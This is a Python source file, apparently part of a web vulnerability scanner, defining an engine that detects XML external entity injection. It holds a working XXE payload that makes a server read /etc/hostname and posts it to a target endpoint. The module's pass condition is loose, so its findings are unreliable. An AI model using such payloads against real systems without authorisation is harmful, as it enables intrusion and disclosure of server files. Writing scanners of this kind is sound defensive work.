"""XXE detection — external entity injection."""

from webbreach.engines import BaseEngine
from webbreach.findings import Finding, Severity


XXE_PAYLOAD = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root><data>&xxe;</data></root>'


class XXEEngine(BaseEngine):
    name = "xxe"
    description = "XML External Entity injection detector"

    def _scan(self) -> list[Finding]:
        findings: list[Finding] = []
        url = f"{self.target_url}/xxe"

        status, body, _ = self._post(url, XXE_PAYLOAD, content_type="application/xml")
        # If server parsed entities, response will contain file content or error
        if status == 200 and ("entities" in body or "error" not in body.lower()):
            findings.append(self._finding(
                severity=Severity.CRITICAL,
                title="XXE — external entity processed",
                method="POST",
                evidence=body[:300],
                payload=XXE_PAYLOAD[:100],
            ))

        return findings
